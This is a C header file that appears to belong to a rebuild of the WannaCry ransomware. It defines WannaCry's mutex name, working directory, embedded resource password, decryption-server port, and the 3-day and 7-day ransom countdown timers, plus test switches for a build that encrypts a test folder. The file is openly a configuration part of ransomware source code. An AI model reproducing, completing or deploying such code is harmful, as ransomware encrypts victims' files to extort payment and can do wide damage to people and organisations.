#ifndef _NOEXCLUSIONS
#include "Exclude.h"	/* Define Preprocessor variables to */
			/* exclude un-wanted header files. */
#endif
#include "Environment.h"
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <io.h>
#include "support.h"
#ifdef _MT
#include <process.h>
#endif
/* DWORD_PTR (pointer precision unsigned integer) is used for integers 
 * that are converted to handles or pointers
 * This eliminates Win64 warnings regarding conversion between
 * 32 and 64-bit data, as HANDLEs and pointers are 64 bits in 
 * Win64 (See Chapter 16). This is enable only if _Wp64 is defined.
 */
#if !defined(_Wp64)
#define DWORD_PTR DWORD
#define LONG_PTR LONG
#define INT_PTR INT
#endif

#define _DEBUG
#ifdef _DEBUG
#define DEBUG(fmt, ...) (_tprintf(_T(fmt), __VA_ARGS__))
#else
#define DEBUG(...) (0)
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL 0xC0000001
#endif

#ifndef DECRYPT_SERVER_PORT
#define DECRYPT_SERVER_PORT "9059"
#endif

#ifndef MUTEX_NAME
#define MUTEX_NAME (_T("Global\\MsWinZonesCacheCounterMutex"))
#endif

#ifndef BASE_DIRNAME
#define BASE_DIRNAME _T("WANNATRY")
#endif

#ifndef ENCRYPT_ROOT_PATH
#define ENCRYPT_ROOT_PATH _T("C:\\TESTDATA")	// encrypt from TESTDATA for save testing
#endif

#ifndef RESOURCE_PASSWORD
#define RESOURCE_PASSWORD "WNcry@2olP"
#endif

#ifndef PRICE_COUNTDOWN
#define PRICE_COUNTDOWN (3 * 86400)		// 3 days
#endif

#ifndef FINAL_COUNTDOWN
#define FINAL_COUNTDOWN (7 * 86400)		// 7 days
#endif

/////////////////////////////////////////////
// Test switch
/////////////////////////////////////////////

// #define TEST_PARAMETER

/////////////////////////////////////////////
// Test parameter
/////////////////////////////////////////////

#ifdef TEST_PARAMETER

#undef  PRICE_COUNTDOWN
#define PRICE_COUNTDOWN (3 * 8)

#undef FINAL_COUNTDOWN
#define FINAL_COUNTDOWN (7 * 8)

#endif
